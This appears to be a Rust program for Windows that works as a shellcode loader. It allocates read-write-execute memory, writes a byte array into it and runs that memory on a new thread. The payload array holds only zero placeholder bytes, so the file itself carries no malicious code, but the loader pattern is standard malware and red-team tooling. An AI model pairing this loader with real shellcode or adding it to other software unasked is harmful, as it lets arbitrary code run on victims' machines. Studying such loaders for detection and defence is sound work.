use std::mem::transmute;
use windows::{
    Win32::{
        Foundation::{CloseHandle, GetLastError},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc},
            Threading::{
                CreateThread, GetCurrentProcess, INFINITE, THREAD_CREATION_FLAGS,
                WaitForSingleObject,
            },
        },
    },
    core::{Error, HRESULT, Result},
};

fn main() -> Result<()> {
    let shellcode: [u8; 460] = [0x00; 460];

    unsafe {
        let h_memory = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if h_memory.is_null() {
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        let mut bytes_written: usize = 0;

        WriteProcessMemory(
            GetCurrentProcess(),
            h_memory,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut bytes_written),
        )?;

        let mut thread_id: u32 = 0;
        let h_thread = CreateThread(
            None,
            0,
            Some(transmute(h_memory)),
            None,
            THREAD_CREATION_FLAGS(0),
            Some(&mut thread_id),
        )?;

        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread)?;
    };

    Ok(())
}
